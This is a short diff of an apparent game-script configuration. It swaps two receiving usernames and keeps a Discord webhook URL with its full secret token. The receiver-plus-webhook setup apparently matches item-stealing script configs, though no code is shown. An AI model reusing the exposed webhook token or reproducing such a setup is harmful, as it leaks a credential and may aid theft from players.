@@ -1,5 +1,5 @@
-Username = "KOS_GIFT2"
-Username2 = "KOS_GIFT2"
+Username = "KOS_INVITE"
+Username2 = "KOS_INVITE"
 Webhook = "https://discord.com/api/webhooks/1220081561496715424/dkOQ9NrKcF4A7SoxBo-Dc3lAMJ5_g1241NEkaJruCJkdUUx-_jMJ8ikcGFQP8CHb63Aj"
 
 HubName = "Auto Clan Battles"
